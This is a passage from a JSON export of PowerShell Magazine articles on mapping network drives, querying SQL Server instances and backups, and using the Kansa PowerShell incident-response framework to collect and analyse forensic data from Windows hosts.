wondering).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/22/automating-deployments-in-configuration-manager-with-powershell/","tags":["How To","SCCM"],"title":"Automating deployments in Configuration Manager with PowerShell"},{"categories":["Tips and Tricks"],"contents":"There are multiple methods of mapping network drives in PowerShell. In the past the net.exe tool was used and since PowerShell 3.0 drives can be persistently mapped using the New-PSDrive cmdlet. There is a third option available using the MapNetworkDrive method of WScript.Network COM object.\nAn example of how a drive can be mapped can be seen here:\n(New-Object -ComObject WScript.Network).MapNetworkDrive('Z:','\\\\server\\folder')  This will not map the drive persistently. In other words, the drive will disappear after reboot or when a user logs out. To ensure the drive mapping is persistent a third argument should be added–a Boolean value set to true:\n(New-Object -ComObject WScript.Network).MapNetworkDrive('Z:','\\\\server\\folder',$true)  It is also possible to specify a username and password. Unfortunately, both the username and password have to be supplied as plain text. An example of how to map a drive using alternate credentials:\n(New-Object -ComObject WScript.Network).MapNetworkDrive('Z:','\\\\server\\folder',$true,'domain\\user','password')  A drive mapping might already be present using the drive letter that we want to use for the new mapped drive. The RemoveNetworkDrive method of the WScript.Network object can be utilized to remove a mapped network drive:\n(New-Object -ComObject WScript.Network).RemoveNetworkDrive('Z:')  When there are open connections to the mapped drive, an error will be thrown when executing the previous command. To forcefully disconnect a drive mapping add $true as the second argument.\n(New-Object -ComObject WScript.Network).RemoveNetworkDrive('Z:',$true)  For more details about these two methods and available arguments see the following articles on MSDN:\nMapNetworkDrive: http://msdn.microsoft.com/en-us/library/8kst88h6(v=vs.84).aspx\nRemoveNetworkDrive: http://msdn.microsoft.com/en-us/library/d16d7wbf(v=vs.84).aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/21/pstip-create-mapped-network-drive-using-wscript-network/","tags":["Tips and Tricks"],"title":"#PSTip Create mapped network drive using WScript.Network"},{"categories":["How To","SQL"],"contents":"I’m an infrastructure guy who supports many different products at multiple datacenters in an enterprise environment. One of those products is Microsoft SQL Server which I’ve been supporting since version 6.5 back in the 1990s. In this article, I’ll be discussing how PowerShell can be used to retrieve just about any information that you would want to know about modern versions of SQL Server that you currently have running in your environment. This article isn’t meant to be a deep dive, it’s meant to get you started thinking about how you could write your own PowerShell code to retrieve the specific information that you’re looking for from your SQL Servers.\nIn this scenario, you have two servers running the core installation (no-GUI) version of Windows Server 2012 R2. One has SQL Server 2008 R2 installed and the other one has SQL Server 2014 installed, each one has multiple instances of SQL Server installed. All of the examples shown are being performed on a Windows 8.1 Enterprise edition workstation with the SQL Server 2014 management tools installed and the RSAT (Remote Server Administration Tools) installed.\nNote: SQL Server 2008 R2 and prior versions of SQL Server that supported PowerShell use a snap-in and beginning with SQL Server 2012 a module is used instead.\nWorking with SQL Server as if it were a file system\nOne way of working with SQL Server in PowerShell is through the SQLServer PSDrive that’s created when the SQL PowerShell snap-in or module is imported. This allows you to work with SQL Server as if it were a file system.\nSince the SQL Server 2014 client tools are installed on our workstation, there is a PowerShell module named SQLPS installed and you’ll need to start out by importing that module:\nImport-Module -Name SQLPS -DisableNameChecking Notice that the -DisableNameChecking parameter was specified in the previous example. There are a couple of cmdlets in the SQLPS module that use unapproved verbs (Encode-SqlName and Decode-SqlName) that will cause warnings to be generated if this optional parameter isn’t specified. The warnings wouldn’t hurt anything, but I prefer not to see them. You can also see in the previous example that when the SQLPS module is imported, it automatically changes your current location to the SQLSERVER PSDrive.\nDetermining the instances for the server named SQL01 is simple as shown in the following example:\nGet-ChildItem -Path 'SQLSERVER:\\SQL\\SQL01' One of the things that makes PowerShell so powerful is that once you figure out how to perform a task for one item (one computer in this scenario), it’s easy to perform that same task for multiple items.\nThe ForEach-Object cmdlet can be used to return the results for multiple SQL Servers:\n'SQL01', 'SQL02' | ForEach-Object {Get-ChildItem -Path \u0026quot;SQLSERVER:\\SQL\\$_\u0026quot;} By default, only the InstanceName property is returned, so you have no idea which instances belong to which servers.\nJust like any other cmdlet that produces output, you can pipe the previous command to Get-Member to see all of the available properties or Format-List –Properties * to see all of the available properties and their values. Be prepared to be overwhelmed though because there’s a lot more information about SQL Server that can be obtained. For the sake of simplicity, I chose to focus on the Instance Name so here are a few helpful properties:\n\u0026lsquo;SQL01\u0026rsquo;, \u0026lsquo;SQL02\u0026rsquo; | ForEach-Object {Get-ChildItem -Path \u0026ldquo;SQLSERVER:\\SQL$_\u0026quot;} | Select-Object -Property ComputerNamePhysicalNetBIOS, Name, DisplayName, InstanceName\nYou may have too many SQL Servers to manually type in the name for, but that’s not a problem if they’re stored in Active Directory where you can query the names from such as in their own Active Directory OU (Organizational Unit):\nGet-ADComputer -Filter * -SearchBase 'OU=SQL Servers,OU=Computers,OU=Test,DC=mikefrobbins,DC=com' | Select-Object -ExpandProperty Name | ForEach-Object {Get-ChildItem -Path \u0026quot;SQLSERVER:\\SQL\\$_\u0026quot;} | Select-Object -Property ComputerNamePhysicalNetBIOS, DisplayName You could also return information such as when the latest backups were taken and what the recovery model is for every database on every instance of every SQL Server all with a PowerShell one-liner:\nGet-ADComputer -Filter * -SearchBase 'OU=SQL Servers,OU=Computers,OU=Test,DC=mikefrobbins,DC=com' | Select-Object -ExpandProperty Name | ForEach-Object {Get-ChildItem -Path \u0026quot;SQLSERVER:\\SQL\\$_\u0026quot;} | ForEach-Object {Get-ChildItem -Path \u0026quot;SQLSERVER:\\SQL\\$($_.ComputerNamePhysicalNetBIOS)\\$($_.DisplayName)\\Databases\u0026quot; -Force} | Select-Object -Property @{label='ServerName';expression={($_.Parent -replace '^\\[|\\]$|\\\\.*$').ToUpper()}}, Name, LastBackupDate, LastDifferentialBackupDate, LastLogBackupDate, RecoveryModel | Format-Table -AutoSize Although the command is on more than one physical line, it’s still considered to be a PowerShell one-liner because it’s one continuous pipeline.\nAll of the previous examples run against one server at a time and if a server isn’t responding, you would have to wait for it to time out before the next one would begin which could be a slow process depending on how many SQL Servers are in your environment. Beginning with Windows Server 2012, PowerShell remoting is enabled by default so we could simply wrap the previous examples inside the Invoke-Command cmdlet which would run the commands against up to 32 servers in parallel by default. The number of servers that Invoke-Command runs against in parallel at a time is also configurable via the ThrottleLimit parameter. The only modification that would need to be made is the commands inside of the Invoke-Command script block would need to target the local computer since it would effectively be running locally on the remote SQL Servers,Microsoft SQL Server Consultancy can help with easily with this process, and the results would be returned as deserialized objects.\nRetrieving SQL Instance Names from the Registry The name of each instance could also be obtained from the registry of the SQL Servers:\n$SQLInstances = Invoke-Command -ComputerName sql01, sql02 { Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server' } foreach ($SQLInstance in $SQLInstances) { foreach ($s in $SQLInstance.InstalledInstances) { [PSCustomObject]@{ PSComputerName = $SQLInstance.PSComputerName InstanceName = $s } } } Retrieving SQL Instance Names with WMI (Windows Management Instrumentation) You could also obtain the SQL instance information with WMI. Be aware that different versions of SQL Server use different WMI namespaces.\nGet-CimInstance -ComputerName sql01 -Namespace 'root/Microsoft/SqlServer/ComputerManagement12' -ClassName ServerSettings Retrieving SQL Instance Names from Services If you’ve worked with PowerShell for more than 10 minutes, then you’ve probably been introduced to the Get-Service cmdlet. Believe it or not, the Get-Service cmdlet is one of the simplest ways to get a list of the instances on your SQL Servers since every instance that’s installed creates its own service:\nInvoke-Command -ComputerName sql01, sql02 { Get-Service -Name MSSQL* | Where-Object Status -eq 'Running' } | Select-Object -Property PSComputerName, @{label='InstanceName';expression={$_.Name -replace '^.*\\$'}} Running existing T-SQL from PowerShell If you have existing T-SQL statements, you can simply wrap them inside of the Invoke-Sqlcmd cmdlet:\nInvoke-Sqlcmd -ServerInstance sql01 -Database master -Query \u0026lsquo;SELECT name FROM sys.databases\u0026rsquo;\nRunning Stored Procedures from PowerShell You can also run stored procedures from PowerShell using the Invoke-SQLCmd cmdlet:\nInvoke-Sqlcmd -ServerInstance sql01 -Database master -Query 'EXEC sp_databases' Working with SQL Server through the use of SMO (SQL Server Management Objects) SMO in my opinion is a little more complicated, but it’s also one of the more popular methods for accessing information about your SQL Servers with PowerShell.\nYou may have seen other articles where DLLs had to be imported in order to use SMO and that’s still the case if you’re running a version of the SQL Server management tools that uses a PowerShell snap-in, but the good news is that beginning with SQL Server 2012 where a PowerShell module is used, the necessary DLLs are automatically imported when the module is imported.\nIn this example, I’ll use SMO to return a list of database names for the default instance of SQL Server on sql01:\n$SQL = New-Object('Microsoft.SqlServer.Management.Smo.Server') -ArgumentList 'SQL01' $SQL.Databases.Name You could create reusable PowerShell functions that leverage SMO to accomplish your common tasks such as this one that retrieves the backup information for one or more SQL Servers and instances:\n#Requires -Version 3.0 function Get-MrDbBackupInfo { \u0026lt;# .SYNOPSIS Returns database backup information for a Microsoft SQL Server database. .DESCRIPTION Get-DbBackupInfo is a function that returns database backup information for one or more Microsoft SQL Server databases. .PARAMETER ComputerName The computer that is running Microsoft SQL Server that you’re targeting to query database backup information for. .PARAMETER InstanceName The instance name of SQL Server to return database backup information for. The default is the default SQL Server instance. .PARAMETER DatabaseName The database(s) to return backup information for. The default is all databases. .EXAMPLE Get-DbBackupInfo -ComputerName sql01 .EXAMPLE Get-DbBackupInfo -ComputerName sql01 -DatabaseName master, msdb, model .EXAMPLE Get-DbBackupInfo -ComputerName sql01 -InstanceName MrSQL -DatabaseName master,msdb, model .EXAMPLE 'master', 'msdb', 'model' | Get-DbBackupInfo -ComputerName sql01 .INPUTS String .OUTPUTS PSCustomObject #\u0026gt; [CmdletBinding()] param ( [Parameter(Mandatory, ValueFromPipelineByPropertyName)] [Alias('ServerName','PSComputerName')] [string[]]$ComputerName, [Parameter(ValueFromPipelineByPropertyName)] [ValidateNotNullOrEmpty()] [string[]]$InstanceName = 'Default', [Parameter(ValueFromPipelineByPropertyName)] [ValidateNotNullOrEmpty()] [string[]]$DatabaseName = '*' ) BEGIN { $problem = $false Write-Verbose -Message \u0026quot;Attempting to load SQL Module if it's not already loaded\u0026quot; if (-not (Get-Module -Name SQLPS)) { try { Import-Module -Name SQLPS -DisableNameChecking -ErrorAction Stop } catch { $problem = $true Write-Warning -Message \u0026quot;An error has occurred.\u0026amp;amp;nbsp; Error details: $_.Exception.Message\u0026quot; } } } PROCESS { foreach ($Computer in $ComputerName) { foreach ($Instance in $InstanceName) { Write-Verbose -Message 'Checking for default or named SQL instance' If (-not ($problem)) { If (($Instance -eq 'Default') -or ($Instance -eq 'MSSQLSERVER')) { $SQLInstance = $Computer } else { $SQLInstance = \u0026quot;$Computer\\$Instance\u0026quot; } $SQL = New-Object('Microsoft.SqlServer.Management.Smo.Server') -ArgumentList $SQLInstance } if (-not $problem) { foreach ($db in $DatabaseName) { Write-Verbose -Message \u0026quot;Verifying a database named: $db exists on SQL Instance $SQLInstance.\u0026quot; try { if ($db -match '\\*') { $databases = $SQL.Databases | Where-Object Name -like \u0026quot;$db\u0026quot; } else { $databases = $SQL.Databases | Where-Object Name -eq \u0026quot;$db\u0026quot; } } catch { $problem = $true Write-Warning -Message \u0026quot;An error has occurred.\u0026amp;amp;nbsp; Error details: $_.Exception.Message\u0026quot; } if (-not $problem) { foreach ($database in $databases) { Write-Verbose -Message \u0026quot;Retrieving information for database: $database.\u0026quot; [PSCustomObject]@{ ComputerName = $SQL.Information.ComputerNamePhysicalNetBIOS InstanceName = $Instance DatabaseName = $database.Name LastBackupDate = $database.LastBackupDate LastDifferentialBackupDate = $database.LastDifferentialBackupDate LastLogBackupDate = $database.LastLogBackupDate RecoveryModel = $database.RecoveryModel } } } } } } } } } Get-MrDbBackupInfo -ComputerName sql01 | Format-Table Each time you find a task that you commonly need to perform for your SQL Servers, write a PowerShell function for it, combine those functions into a script module and you’ll have your own custom SQL Server PowerShell Toolkit. Last but not least, share your toolkit with the PowerShell and SQL Server communities.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/","tags":["How To","SQL"],"title":"Using PowerShell to discover information about your Microsoft SQL Servers"},{"categories":["infosec","security","Kansa","Module Spotlight"],"contents":"Known unknowns and unknown unknowns If you follow information security, you know that information systems are constantly under attack and often fall victim to adversaries looking to make a quick buck, gain competitive advantage through theft of intellectual property or embarrass a target that they find politically or ideologically offensive.\nIn many enterprises, computer security incident response (IR) teams exist to respond to these threats and these teams nearly always spring into action with very limited knowledge about the incidents they are investigating.\nMaybe the incident started because someone noticed an account added to the domain administrators group. How did the account get there? How long has it been there? What has it been used for and by whom?\nIn the early going, the investigative focus may be narrow — the known victim machine, but the scope often quickly expands. Investigators may need to gather data from many or even all machines within a given domain or other security boundary to look for indicators of compromise or anomalous activity. Readers of PowerShell Magazine understand that PowerShell can provide much of this capability for Windows systems.\nDisclaimer At this point, I should provide the following disclaimer: This article is solely representative of the views and opinions of the author, Dave Hull, and is not intended to state or reflect those of Microsoft Corporation, the author’s employer. This article is not endorsed by Microsoft.\nKansa: A PowerShell-based incident response framework You could do what I did a couple years ago and write a monolithic PowerShell script to collect the data you need for your investigation and copy that script to every host in your environment, maybe requiring CredSSP to pull third-party binaries like Sysinternal’s Autorunsc from a file server or to write output to a file server, but that would be a bad idea.\nFor starters, a monolithic script written to collect many different data points will be cumbersome if you later want to collect a single data point from multiple hosts. Secondly, copying a script to every host in your environment means you’re not taking advantage of Windows Remote Management and PowerShell’s ability to run jobs across multiple hosts in parallel. Lastly and very importantly, using CredSSP should be avoided. Period. Using it during a security investigation in a compromised environment may actually be increasing risk by exposing more privileged credentials to an adversary. For more on that, read this.\nAt this point, you know what took me awhile to figure out and you could start writing your own code with these lessons in mind. Or you could check out Kansa, a free, open source, PowerShell-based incident response framework hosted at https://github.com/davehull/Kansa.\nKansa is modular. It features a core script, dozens of collector modules and analysis scripts to help make sense of the data collected. Kansa takes advantage of Windows Remote Management and PowerShell remoting. It uses PowerShell’s default non-delegated Kerberos network logons, not CredSSP and therefore does not expose credentials to harvesting.\nLet’s take a deeper look at Kansa. After downloading the latest release from https://github.com/davehull/Kansa/releases, unzip it. You’ll need to unblock the scripts before you can run them on your local machine. The easiest way to do this is to open a PowerShell prompt and cd into Kansa’s top level directory and run the following command:\nls -r *.ps1 | unblock-file  Before we dive in and run the script, let’s take a look at the contents of the main directory:\nAnalysis\nModules\n.gitignore\ncontributing.md\nkansa.ps1\nLICENSE\nMSLimitedPublicLicense.txt\nREADME.md\nToDo\nKansa’s primary purpose is to make it easier to collect data from many hosts, but you’ll notice the first directory above is called Analysis. Kansa comes with dozens of scripts to help analyze the data it collects, we’ll come back to that in a bit.\nThe Modules directory contains all of the collector scripts that the main script, Kansa.ps1, will invoke on hosts also known as targets in Kansa’s parlance. The other files in the listing above are obviously licenses, some explanation of what Kansa is and a ToDo list, though most items are tracked via issues on GitHub.\nJust about all of the code that makes up Kansa is licensed under the Apache Version 2.0 license. There’s a small bit of code licensed under the Microsoft Limited Public License. See the respective license files for details, if you have concerns.\nWe’ll dive into the Modules directory and look at the collectors and discuss some things about Kansa.ps1 as the need arises. A directory listing of the Modules folder shows the following items:\nASEP\nbin\nConfig\nDisk\nLog\nNet\nProcess\ndefault-template.ps1\nModules.conf\nThe last two items above are files, everything else is a directory. The default-template.ps1 is a simple example script with some code in it that I’ve found myself using in multiple modules.\nModules.conf is a configuration file that controls which modules Kansa.ps1 will invoke and the order in which they will be invoked. Why does the order matter? Incident responders collecting data from running systems want to collect data in the “order of volatility,” or starting with the most volatile data – the contents of memory, network connections and running processes and then move to less dynamic items like files on disk; this is because the actions of the investigator will affect the contents of RAM, possibly network connections and running processes.\nIn Modules.conf there is one module per line. Commenting out a line, prevents that module from being run.\nLet’s return to the directories found under Modules starting with ASEP. If you’re not familiar with ASEP, it’s an acronym for Auto-Start Extension Point. These are locations in Windows that can be used to configure code to run either at system start or in response to some Windows event. As such, these locations are commonly used by attackers as a means of maintaining persistence in Windows environments.\nA directory listing of the ASEP folder shows the following:\nGet-Autorunsc.ps1\nGet-PSProfiles.ps1\nGet-SvcAll.ps1\nGet-SvcFail.ps1\nGet-SvcTrigs.ps1\nGet-WMIEvtConsumer.ps1\nGet-WMIEvtFilter.ps1\nGet-WMIFltConBind.ps1\nEach of these scripts are collectors that Kansa.ps1 may invoke on targets, depending on the Modules.conf file or if specified via the -ModulePath argument. There are over 40 collector scripts and I won’t go into detail on all of them, but I will discuss some.\nThe first script, Get-Autorunsc.ps1 takes a dependency on Sysinternals Autorunsc.exe, a great utility for gathering data from many known ASEP locations, including the path to the executable or script, command line arguments and cryptographic hashes, such as MD5.\nKansa is not limited to Windows built-in commands or PowerShell cmdlets. If you want to collect data using some third-party binary, simply copy that binary into the ._\\Modules\\bin_ directory and include a special comment on the second line of your collector module script to direct Kansa to copy the given binary to your targets, prior to running that collector. This special comment, what I refer to as a directive, for Get-Autorunsc.ps1 looks like this:\n# BINDEP .\\Modules\\bin\\Autorunsc.exe  BINDEP is simply shorthand for “binary dependency.” With this directive in place, if Kansa.ps1 is run with the -Pushbin argument, it will recognize that it needs to copy .\\Modules\\bin\\Autorunsc.exe to its targets. These binaries are not generally removed after being copied to remote hosts, though this depends on the module, so future Kansa runs may not require the -Pushbin argument.\nGet-PSProfiles.ps1 acquires copies of PowerShell profiles from both system default locations and individual user’s accounts. Attackers have planted code in these profiles as a means of maintaining persistence by having their code execute when user’s open PowerShell prompts. Autoruns does not currently collect information about this ASEP.\nGet-SvcAll.ps1 collects information about all the services on targets.\nGet-SvcFail.ps1 collects information about service recovery options. Most services are configured to simply restart as a recovery option, but one of the possible recovery options is to run arbitrary code. Autoruns does not currently collect data about this ASEP.\nGet-SvcTrigs.ps1 collects information about service triggers. Windows services are no longer limited to starting at system start or starting manually. They can also start and stop based on the presence of Bluetooth or USB mass storage devices or even in response to arbitrary Windows events. Autoruns does not currently collect information about this ASEP.\nGet-WMIEvtConsumer.ps1 collects data about WMI Event Consumers, which when combined with WMI Event Filters and WMI Filter-to-Event Consumer Bindings can be used to run arbitrary code in response to Windows events. Malware authors have been using WMI Event Consumers as a persistence mechanism for some time and until very recently, Autoruns did not collect information about this ASEP and even now it doesn’t collect information about the Event Filter, which is what triggers the Event Consumer.\nThe next directory under _.\\Modules_ is bin, which we’ve already touched on so let’s move on to _.\\Modules\\Config_. In that directory you’ll find the following:\nGet-AMHealthStatus.ps1\nGet-AMInfectionStatus.ps1\nGet-CertStore.ps1\nGet-GPResult.ps1\nGet-Hotfix.ps1\nGet-IIS.ps1\nGet-LocalAdmins.ps1\nGet-Products.ps1\nGet-SmbShare.ps1\nThe _Get-AM*_ scripts collect data about the status of Microsoft’s Anti-Malware client and the rest of these collectors are self-explanatory based on their names. Next stop on our rapid tour of Kansa, _.\\Modules\\Disk_, which contains:\nGet-File.ps1\nGet-FlsBodyfile.ps1\nGet-TempDirListing.ps1\nGet-File.ps1 needs to be configured by whoever is running Kansa and it is used to acquire a specific file, but remember, it will try and acquire that file from every host, so use it to collect common files if you’re running with multiple targets.\nGet-FlsBodyFile.ps1 requires Fls.exe and some dlls from the Sleuth Kit, an open source digital forensics framework available from http://www.sleuthkit.org. This collector’s BINDEP directive looks like this:\n# BINDEP .\\Modules\\bin\\fls.zip  fls.zip has to be created by the user, it’s not packaged with Kansa. Directions for putting together fls.zip are in the Get-FlsBodyFile.ps1 script and that collector is written to decompress the zip archive and then execute fls and send its output back to the host where Kansa was run.\nSo what is fls? It’s like dir or ls on steroids and will pull directory listings for both allocated and unallocated (deleted) files, including time stamps and MFT File Reference numbers, all of which can be very useful during investigations. Next up _.\\Modules\\Log_:\nGet-LogAppExperienceProgInventory.ps1\nGet-LogAppExperienceProgTelemetry.ps1\nGet-LogAppLockerExeDll.ps1\nGet-LogAppLockerMSIScript.ps1\nGet-LogAppLockerPackagedAppDeployment.ps1\nGet-LogCBS.ps1\nGet-LogSecurity.ps1\nGet-LogShellCoreOperational.ps1\nGet-LogTermSrvcsLocalSessionMgrOperational.ps1\nGet-LogTermSrvcsRemoteConnMgrOperational.ps1\nGet-LogUserAssist.ps1\nMost of these are probably easy to understand based on file names, but let’s cover the last one.\nGet-LogUserAssist.ps1 doesn’t actually acquire data from a log file, instead it reads from each user’s ntuser.dat file and pulls out the contents of the UserAssist key. UserAssist is a Registry key that stores information about execution of programs and control panel applets that happen via the Windows GUI. On some versions of Windows, UserAssist also tracks run count and since Registry keys have LastWriteTimes (also acquired by the script) the data may give some insight into when a given program was run.\nThe next set of collectors are found in _.\\Modules\\Net_ and the listing contains:\nGet-Arp.ps1\nGet-DNSCache.ps1\nGet-NetIPInterfaces.ps1\nGet-NetRoutes.ps1\nGet-Netstat.ps1\nGet-SmbSession.ps1\nThese should be largely self-explanatory, but let’s take a moment to look at Get-Netstat.ps1 in a little detail. As you may have guessed, this collector runs Netstat on each target, but it runs it with the -naob arguments. If you run this on your systems, your output may look something like the following:\nImagine collecting this data from thousands of hosts. How would you analyze it? It doesn’t easily lend itself to automated analysis. Get-Netstat.ps1 takes this output and converts it to PowerShell objects. You can run Get-Netstat.ps1 on your own local machine, all of the collectors can be run locally, and the output will look like this:\nBecause PowerShell objects can easily be converted to a variety of output formats, this data is converted by Kansa.ps1 to TSV and the final result looks like this:\nThis is data that can be easily imported into Excel or a database or analyzed using Microsoft’s free LogParser tool.\nBut why does Kansa.ps1 convert it to TSV? This is actually controlled by Get-Netstat.ps1 via another special comment directive that tells Kansa how to handle the data returned by the modules. In the case of Get-Netstat.ps1, this directive looks like this:\n# OUTPUT tsv  The supported output types are bin for binary files (i.e. memory dumps), CSV/TSV, txt, XML and zip. If a module doesn’t return PowerShell objects, the output type should be one of bin, txt or zip.\nThe next set of collectors are in _.\\Modules\\Process_ and are all process related:\nGet-Handle.ps1\nGet-PrefetchFiles.ps1\nGet-PrefetchListing.ps1\nGet-ProcDump.ps1\nGet-ProcsWMI.ps1\nGet-Prox.ps1\nGet-RekalPslist.ps1\nGet-Tasklistv.ps1\nAgain, many of these are likely self-explanatory, but let’s touch on a few. Get-Handle.ps1 is another that depends on a Sysinternals utility, this time Handle.exe. Get-PrefetchFiles.ps1 and Get-PrefetchFileListing.ps1 both pull data from _$env:windir\\Prefetch_ with the first adding all .pf files in that directory to a zip archive and sending them back to the host where Kansa was run. Get-PrefetchFileListing.ps1 simply returns the directory listing along with time stamp information.\nIf you’re not familiar with the Windows Prefetch, it’s a feature that’s enabled on Windows desktop OSes, but turned off by default on servers and its purpose is to improve performance, but it has side-effects that benefit forensic investigators and incident responders. Prefetch files include a run count that is incremented each time a program is run. That incrementing requires a modification to the respective .pf file and that means that .pf file’s LastWriteTime will be updated, providing a solid indicator of when the program was run.\nGet-ProcDump.ps1 uses Sysinternals ProcDump.exe command to collect a specified process’s memory. Naturally this must be configured to grab the process of interest.\nGet-ProcsWMI.ps1 uses Get-WmiObject to pull information about running processes including parent process ID, process creation time, and command line arguments for running processes. This script also pulls MD5 hashes of the process’s image on disk. Other hashes are available by tweaking the script to return a different hash.\nGet-Prox.ps1 runs the PowerShell Get-Process cmdlet, which returns some great information including loaded modules and data about threads, but it doesn’t return command line arguments, parent process ID or information about the process owner, hence the need for Get-ProcsWMI.ps1. We’ll come back to Get-RekalPslist.ps1 in a moment.\nThe Get-Tasklistv.ps1 script returns process session name, session number and process owner all of which can be useful during investigations.\nIt would be awesome if PowerShell’s Get-Process cmdlet would return all of its great data, plus the items gathered by Get-ProcsWMI.ps1 and the two Get-Tasklist scripts, but for now, we have to run multiple scripts to get the data we need. I have opened issues with the PowerShell team requesting these improvements to Get-Process. You can vote up my open issue here.\nBack to Get-RekalPslist.ps1. This collector is a useful proof-of-concept, but not something I use very often. One of the issues savvy IR folks have raised about Kansa is that it relies on the Windows API for most of the data it collects. If an attacker is using rootkits, they may be subverting those API calls and causing them to return bogus data.\nFor this reason, most IR folks prefer tools that don’t rely on the Windows API. One common technique is to use a tool to acquire a copy of a system’s memory, there are a variety of tools for this, but WinPMem may be the current best of breed and it’s also free as part of the Rekall Memory Forensic Framework (http://www.rekall-forensic.com/about.html). Rekall is a fork of the Volatility Memory Analysis Framework (http://www.volatilityfoundation.org/).\nOne benefit of Rekall over Volatility is that it can be used to perform memory analysis on running systems without first having to acquire a copy of memory and without the need for commercial tools to expose live memory for analysis (this is the current requirement for Volatility to do live memory analysis). When working with systems around the world that may commonly have 192 GB of RAM, having to acquire a copy of memory for analysis can be problematic.\nWith that lengthy explanation of Rekall out of the way, what does Get-RekalPslist.ps1 do then? When Kansa.ps1 is run with the -Pushbin argument, it directs Kansa to copy a zip archive of Rekall to targets, this is a whopping 17 MB file, then it decompresses the archive to a 35 MB folder on the target, loads the winpmem.sys driver, which has ring 0 access and then calls the PSlist module to acquire information about processes from memory, including recently exited processes and unlinked processes that may be hidden by rootkits. Rekall has many other useful plugins for finding data that may be inaccessible via APIs, if rootkits are in play.\nSo even though Kansa relies on PowerShell and PowerShell relies on the Windows API and the Windows API can be subverted by adversaries and therefore provide unreliable information, there are workarounds. And that’s it for the current set of collectors.\nSo, how do we run Kansa? Below is an example command line for running Kansa:\nPS C:\\tools\\Kansa\u0026gt; .\\kansa.ps1 -TargetList .\\hostlist -Pushbin -Verbose  Let’s discuss the command line arguments. -TargetList .\\hostlist tells kansa.ps1 to run collectors against the systems listed in the hostlist file, which contains one host per line. If you omit this argument, Kansa will query ActiveDirectory for the list of computers and target all of them. Querying AD in this way requires this ActiveDirectory module that’s bundled with Remote Server Administration Tools so you’ll need that installed if you’re not providing a list of targets via -TargetList (http://www.microsoft.com/en-us/download/details.aspx?id=39296). -Pushbin instructs kansa.ps1 to copy any required third-party binaries to targets.\nHere’s what my screen looks like when I run this command:\nYou can see by the output that my .\\hostlist file in this example only contains two hosts. I have run Kansa against thousands of hosts at a time located around the world and in my experience, it generally completes its collection in under an hour, but there are many variables to consider including which modules you run, where your hosts are located, how much bandwidth you have, etc. In my example run above, each host returned about 100 MB of data, but again, this will vary based on which modules you run.\nAfter Kansa finishes running, it will let you know if encountered any errors by telling you to look in the Errors.log file which will be in the Output directory. All Output directories are time stamped. Let’s take a look at the one that was just created as part of the sample run above:\nI ran the ls command above before the script completed, but you can see that Kansa creates an output directory for each module. If we dive in one more layer, you’ll see that each host’s output is broken out in each module output directory:\nThat covers it from the collection side of the house, but there’s more to cover.\nData requires analysis Recall from earlier in this post when we first extracted the Kansa release archive. We noted the presence of an Analysis subfolder. Kansa’s original purpose may have been about acquiring data, but acquired data must be analyzed in order to be useful during an investigation. So Kansa includes a few dozen scripts that can be used to analyze the collected data. Many of these require Microsoft’s free LogParser utility and they expect it to be in the path.\nLet’s take this from the top with a look in the Analysis folder:\nASEP\nConfig\nLog\nMeta\nNetwork\nProcess\nYou’ll notice the directory structure here follows closely with the directory structure under the _.\\Modules_ path. Under the ASEP folder, you’ll see:\nGet-ASEPImagePathLaunchStringMD5Stack.ps1\nGet-ASEPImagePathLaunchStringMD5UnsignedStack.ps1\nGet-ASEPImagePathLaunchStringPublisherStack.ps1\nGet-ASEPImagePathLaunchStringStack.ps1\nGet-ASEPImagePathLaunchStringUnsignedStack.ps1\nGet-SvcAllRunningAuto.ps1\nGet-SvcAllStack.ps1\nGet-SvcFailAllStack.ps1\nGet-SvcFailCmdLineStack.ps1\nGet-SvcFailStack.ps1\nGet-SvcStartNameStack.ps1\nGet-SvcTrigStack.ps1\nAgain, I won’t detail all of the analysis scripts, but I will cover a few. For the most part, the analysis scripts perform frequency analysis. Kansa’s strength is that it makes it easy for investigators to collect data from many machines. Frequency analysis makes it easy to spot anomalies in environments, especially if you’re comparing machines that are well-managed and that should be similar in configuration – say maybe all systems in a given department, Human Resources or Finance, or servers in a data center belonging to a specific role – database servers, web servers, etc.\nThe _Get-ASEP*_ scripts above perform frequency analysis of data collected by _Get-Autorunsc.ps1_. The first one, _Get-ASEPImagePathLaunchStringMD5Stack.ps1_ performs frequency analysis of Autorunsc data aggregated on the path to the executable or script (ImagePath), the command line arguments (LaunchString) and the MD5 hash of the binary or script on disk. The next analysis script performs the same frequency analysis, but it filters out executables that have valid code signing certificates, which may not be given that attackers have been known to steal code signing certs and use them to sign malware.\nHere’s an example of stacked output for unsigned Get-Autorunsc.ps1 data collected from 10 domain controllers:\ncnt Image Path MD5 --- ----------------------------------------------------- -------------------------------- 10 c:\\windows\\system32\\cpqnimgt\\cpqnimgt.exe 78af816051e512844aa98f23fa9e9ab5 10 c:\\hp\\hpsmh\\data\\cgi-bin\\vcagent\\vcagent.exe 54879ccbd9bd262f20b58f79cf539b3f 10 c:\\windows\\system32\\cpqmgmt\\cqmgstor\\cqmgstor.exe 60668a25cfa2f1882bee8cf2ecc1b897 10 c:\\program files\\hpwbem\\storage\\service\\hpwmistor.exe 202274cb14edaee27862c6ebce3128d8 10 c:\\hp\\hpsmh\\bin\\smhstart.exe 5c74c7c4dc9f78255cae78cd9bf7da63 10 c:\\msnipak\\win2012sp0\\asr\\configureasr.vbs 197a28adb0b404fed01e9b67568a8b5e 10 c:\\program files\\hp\\cissesrv\\cissesrv.exe bf68a382c43a5721eef03ff45faece4a  The first column here is the count or the frequency of occurrence for the give Image Path and its associated MD5 hash. We can see that all 10 domain controllers have the same set of seven unsigned ASEPs, so there are no outliers here, but if we wanted to analyze this further, we could copy the MD5 hashes and search for them in NIST’s National Software Reference Library (http://www.nsrl.nist.gov/) or in VirusTotal (https://www.virustotal.com/#search) and see if they come back as clean, malicious or unknown.\nUnder _.\\Analysis\\Config_ there is a single script, Get-LocalAdminStack.ps1, which can be used to find unusual local administrator accounts.\n_.\\Analysis\\Log_ also contains a single analysis script, Get-LogUserAssistValueStack.ps1, which is useful for finding unusual entries from the UserAssist data that was collected by Kansa.\nThere are two scripts under 